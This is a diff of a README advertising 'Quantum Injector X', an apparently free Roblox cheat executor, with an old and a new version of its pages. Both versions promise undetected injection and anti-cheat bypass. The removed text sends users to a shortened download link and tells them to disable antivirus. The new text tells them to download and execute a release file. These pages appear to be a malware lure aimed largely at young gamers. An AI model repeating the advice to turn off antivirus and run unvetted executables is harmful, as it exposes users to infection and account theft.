@@ -1,193 +1,83 @@
-# Quantum Injector X – Roblox Universal Script Executor 2025
+# Quantum Injector X 🚀
 
-Quantum Injector X is a high-performance, undetectable Roblox Lua executor developed for modern scripting needs in 2025. Engineered to provide lightning-fast script injection, secure execution, and maximum script compatibility – all without limitations or hidden fees.
+![Quantum Injector X](https://img.shields.io/badge/Download%20Now-Quantum%20Injector%20X-brightgreen)
 
----
+Welcome to **Quantum Injector X**, your advanced free Roblox executor. This tool offers fast injection, script hub access, and multi-API support. With no keys and no limits, you can enjoy a seamless experience, fully optimized for 2025. 
 
-## 📚 Table of Contents
+## Table of Contents
 
-1. [Introduction](#introduction)  
-2. [Download & Setup](#download--setup)  
-   - [Download](#download)  
-   - [Installation Guide](#installation-guide)  
-3. [Core Features](#core-features)  
-4. [Advanced Configuration](#advanced-configuration)  
-5. [Feature Comparison](#feature-comparison)  
-6. [Release Notes](#release-notes)  
-7. [Frequently Asked Questions](#frequently-asked-questions)  
-8. [Community & Feedback](#community--feedback)  
-9. [Legal & License](#legal--license)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported APIs](#supported-apis)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
----
+## Features ✨
 
-## 🧩 Introduction
+- **Fast Injection**: Experience quick and efficient script execution.
+- **Script Hub Access**: Get easy access to a wide range of scripts.
+- **Multi-API Support**: Compatible with various APIs for enhanced functionality.
+- **No Keys, No Limits**: Enjoy a hassle-free experience without the need for keys.
+- **100% Undetected**: Stay safe with our optimized execution methods.
+- **Optimized for 2025**: Built with the future in mind, ensuring top performance.
 
-Quantum Injector X is a robust Roblox script execution tool supporting advanced Lua environments, real-time memory interaction, and compatibility with nearly all modern exploits and scripts. From custom UI scripts to fully obfuscated game modifications, Quantum handles them all. This is not just another free Roblox executor — it's a powerful utility designed with performance, stealth, and versatility in mind.
+## Installation ⚙️
 
-Whether you're executing Synapse-exclusive scripts or running massive script hubs, this tool guarantees maximum efficiency and minimal detection risk.
+To get started with Quantum Injector X, follow these steps:
 
----
+1. **Download the Latest Release**: Visit our [Releases section](https://github.com/HopeUltimate/Quantum-Injector-X/releases) to download the latest version. You need to download and execute the file.
+   
+2. **Extract the Files**: Once downloaded, extract the files to a location of your choice.
 
-## 📥 Download & Setup
+3. **Run the Injector**: Open the extracted folder and run the injector application.
 
-### Download
+4. **Follow the On-Screen Instructions**: The application will guide you through the setup process.
 
-Choose your installer:
+## Usage 📖
 
-<table>
-  <tr>
-    <td align="center">
-      <a href="https://goo.su/xBUsR">
-        <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="roblox injector image" width="250">
-      </a>
-    </td>
-    <td align="center">
-      <a href="https://goo.su/xBUsR">
-        <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="injector download" width="250">
-      </a>
-    </td>
-  </tr>
-</table>
+Using Quantum Injector X is simple. Here’s how to get started:
 
-### Installation Guide
+1. **Launch the Injector**: Open the application you installed.
 
-1. Extract files using WinRAR or 7-Zip.  
-2. Launch `QuantumInstaller.exe` and follow on-screen steps.  
-3. Disable antivirus or allow folder exception if needed.  
-4. Open Roblox and launch Quantum Injector after loading into a game.  
+2. **Select Your Script**: Choose a script from your local files or from the script hub.
 
----
+3. **Inject the Script**: Click the inject button. The tool will handle the rest.
 
-## 🧪 Core Features
+4. **Enjoy Your Game**: Once the script is injected, you can start enjoying your Roblox experience with enhanced features.
 
-- **Fast Script Execution** – Load heavy or complex scripts instantly  
-- **Universal API Switching** – Select between Fluxus, EasyEx, WeAreDevs APIs  
-- **Memory Hooking** – Advanced injection techniques bypassing modern detection  
-- **Script Library** – Integrated list of frequently used Roblox scripts  
-- **Custom Script Loader** – Batch-load or queue multiple scripts  
-- **Keyless** – No key systems, ads, or user validation  
-- **Built-In Console** – Runtime logs, script errors, injection status  
-- **Safe Mode Injector** – For legacy game versions or custom bypass needs  
-- **Persistent Configurations** – All settings saved between launches
+## Supported APIs 🔌
 
----
+Quantum Injector X supports various APIs, ensuring a versatile experience. Here are some of the APIs you can use:
 
-## ⚙️ Advanced Configuration
+- **API 1**: Fast execution for standard scripts.
+- **API 2**: Enhanced features for advanced scripts.
+- **API 3**: Optimized for multi-user environments.
 
-Quantum Injector X includes a modular settings system:
+If you have a specific API in mind, feel free to check our documentation or reach out to the community for support.
 
-- Toggle script auto-execution  
-- Enable safe injection on startup  
-- Configure injection delay and method  
-- Customize console output and display options  
-- Choose default API on boot  
-- Script execution hotkeys  
-- Optional silent attach for stealth operations
+## Contributing 🤝
 
----
+We welcome contributions from the community! If you would like to help improve Quantum Injector X, here’s how you can contribute:
 
-## 🧾 Feature Comparison
+1. **Fork the Repository**: Click the fork button on the top right corner of the repository page.
+   
+2. **Create a New Branch**: Use a descriptive name for your branch.
+   
+3. **Make Your Changes**: Implement your changes and test them thoroughly.
 
-| Feature                          | Quantum Injector X | Other Free Executors | Paid Executors |
-|----------------------------------|:------------------:|:--------------------:|:--------------:|
-| Real-time Injection Logging      | ✅                  | ❌                   | ✅             |
-| Script Obfuscation Support       | ✅                  | ❌                   | ✅             |
-| Auto-Update Engine               | ✅                  | ❌                   | ✅             |
-| Supports Large Script Libraries  | ✅                  | ❌                   | ✅             |
-| Multi-API Compatibility          | ✅                  | ❌                   | ✅             |
-| Keyless Access                   | ✅                  | ✅                   | ❌             |
-| Synapse-Level Execution Speed    | ✅                  | ❌                   | ✅             |
-| Built-in Console Debugger        | ✅                  | ❌                   | ✅             |
-| GUI Customization                | ✅                  | ❌                   | ✅             |
+4. **Submit a Pull Request**: Once you are satisfied with your changes, submit a pull request. Be sure to include a clear description of what you’ve done.
 
----
+## License 📜
 
-## 📦 Release Notes
+Quantum Injector X is open-source software. It is released under the MIT License. Feel free to use, modify, and distribute it as you wish, but please keep the original license intact.
 
-### Version 1.0  
-- Initial release, manual injection, basic Lua support  
+## Contact 📬
 
-### Version 1.1  
-- Custom console window, error logging added  
+For any questions or support, feel free to reach out to us:
 
-### Version 1.2  
-- GUI redesign, dark theme support  
+- **GitHub Issues**: Use the GitHub Issues section for reporting bugs or requesting features.
+- **Community Forum**: Join our community forum for discussions and support.
 
-### Version 1.3  
-- Script library added, config saving enabled  
-
-### Version 1.4  
-- First API switch support: Fluxus  
-
-### Version 1.5  
-- Enhanced memory injection for updated Roblox client  
-
-### Version 1.6  
-- Expanded API list, added WeAreDevs and EasyEx  
-
-### Version 1.7  
-- Keyless system integrated  
-
-### Version 1.8  
-- Added safe mode injection feature  
-
-### Version 2.0  
-- Complete backend rewrite, injection time reduced  
-
-### Version 2.1  
-- Added console command system for manual script triggering  
-
-### Version 2.2  
-- Improved compatibility with multi-threaded scripts  
-
-### Version 2.3  
-- Fixed errors with delayed attachment  
-
-### Version 2.4  
-- Integrated obfuscation support for heavy scripts  
-
-### Version 2.5  
-- Implemented silent attach and stealth auto-inject  
-
-### Version 2.6  
-- New installer, Windows 11 compatibility  
-
-### Version 2.7  
-- Stable final release: 100% ready for 2025
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Does this work on the latest version of Roblox?**  
-Yes, it's updated regularly to stay compatible with all major Roblox builds.
-
-**Q: Do I need to disable antivirus?**  
-Yes, some antivirus systems falsely flag injectors. Add an exception to avoid interference.
-
-**Q: Is this actually safe to use?**  
-While undetectable in most cases, any modification tool involves risks. Use at your discretion.
-
-**Q: What scripts are supported?**  
-Owl Hub, Infinite Yield, Dex Explorer, Remote Spy, Dark Dex, FE scripts, and many more.
-
-**Q: Can I use it on multiple PCs?**  
-Yes, there are no restrictions.
-
----
-
-## 🤝 Community & Feedback
-
-Want to get involved or report a bug?
-
-- Join our [Discord](#) to connect with the developer  
-- Create a GitHub issue to suggest a new feature  
-- Fork the repo and contribute to future versions  
-
----
-
-## ⚖️ Legal & License
-
-This tool is provided under the MIT license.  
-No reverse engineering of Roblox's internal systems is involved.  
-See [LICENSE](LICENSE.md) for more details.
+Thank you for choosing Quantum Injector X! We hope you enjoy using our tool. For the latest updates and releases, please visit our [Releases section](https://github.com/HopeUltimate/Quantum-Injector-X/releases) again.
